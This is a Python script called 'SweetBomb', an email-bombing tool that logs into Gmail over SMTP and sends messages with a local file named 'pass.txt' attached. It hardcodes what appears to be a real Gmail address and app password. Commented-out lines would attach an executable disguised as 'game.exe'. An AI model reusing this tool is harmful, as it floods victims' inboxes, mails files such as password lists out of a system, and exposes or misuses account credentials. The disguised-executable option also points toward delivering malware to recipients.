import smtplib as smtp
from email.message import EmailMessage
import time, pyfiglet
# import requests

banner = pyfiglet.figlet_format("SweetBomb")
print("\033[92m"+banner, end="")
print("\033[93m" + "|"+"_"*22 + "@Yashparwal1" + "_"*22+"|")
print("\n")

# Configure these variables as suitable
mail_id = "zshadowoff@gmail.com"
app_pass = 'kznhczrcvwunsllj'
from_addr = "zshadowoff@gmail.com"
to_addr = "killerhkr1@gmail.com"
host = 'smtp.gmail.com'
port = 587
sub = 'Another test'
msg_body = 'hello this is demo msg'
count = 0

#creating EmailMessage object
def template():
    msg = EmailMessage()
    msg["From"] = from_addr
    msg["To"] = to_addr
    msg['Subject'] = sub
    msg.set_payload(msg_body)
    with open("pass.txt","rb") as file:
        msg.add_attachment(file.read(), maintype='text', subtype='plain', filename='pass.txt')
        # msg.add_attachment(file.read(), maintype='image', subtype='jpg', filename='image.jpg')
        # msg.add_attachment(file.read(), maintype='application', subtype='pdf', filename='pass.pdf')
        # msg.add_attachment(file.read(), maintype='application', subtype='exe', filename='game.exe')
    return msg

def send_msg(conn, msg):
    conn.send_message(msg)
    global count
    count+=1
    if count == 1:
        print("\033[91m" + str(count) + " Message sent")    
    else:
        print("\033[91m" + str(count) + " Messages sent")    
        

for i in range(1):
    conn = smtp.SMTP(host=host, port=port)
    conn.starttls()
    conn.login(user=mail_id, password=app_pass)
    for i in range(1):
        message = template() #func create EmailMessage object
        send_msg(conn, message)
        time.sleep(1)
    time.sleep(2)
conn.close()